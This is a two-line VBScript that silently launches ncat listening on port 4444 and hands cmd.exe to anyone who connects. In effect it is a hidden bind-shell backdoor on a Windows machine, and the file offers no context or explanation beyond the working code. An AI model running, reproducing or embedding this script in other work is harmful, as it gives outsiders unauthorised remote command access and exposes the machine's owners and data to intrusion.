Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run "ncat -l -p 4444 -e cmd.exe", 0, False 
